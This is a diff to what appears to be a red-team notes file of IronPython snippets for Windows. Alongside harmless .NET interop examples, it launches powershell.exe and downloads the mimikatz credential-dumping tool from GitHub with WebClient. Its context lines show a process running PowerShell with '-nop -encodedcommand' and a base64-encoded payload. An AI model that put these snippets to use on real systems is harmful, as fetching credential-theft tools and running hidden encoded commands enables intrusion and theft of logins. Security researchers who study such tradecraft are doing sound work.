@@ -31,6 +31,17 @@ def f():
 
 f()
 """
+
+
+>>> import clr
+..> clr.AddReference("System.Windows.Forms")
+..> from System.Windows.Forms import MessageBox
+..> MessageBox.Show("Hello World")
+..> END
+
+
+
+import clr
 clr.AddReference("System")
 from System import Console, ConsoleColor
 Console.ForegroundColor = ConsoleColor.Red;
@@ -133,3 +144,32 @@ p.StartInfo.Arguments = " -nop -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAd
 p.Start()
 p.WaitForExit() 
 """
+
+## .Net via Py
+import sys, clr
+clr.AddReference("System")
+clr.AddReference("System.IO")
+from System import Console
+from System.IO import Path
+print(Path.GetFileName("C:\\file"))
+
+
+
+## Bring in STDLIB
+>>> import sys
+>>> sys.path.append("C:\IronPython-2.7.7\LibR.docx")
+>>> import os
+
+
+## Launching external process
+from System.Diagnostics import Process
+Process.Start('powershell.exe', '')
+
+
+## Download of file over TLS
+
+from System.Net import WebClient
+wc = WebClient()
+from System.Net import ServicePointManager, SecurityProtocolType
+ServicePointManager.SecurityProtocol  = SecurityProtocolType.Tls12
+wc.DownloadFile("https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180322/mimikatz_trunk.zip", "mimikatz.zip")
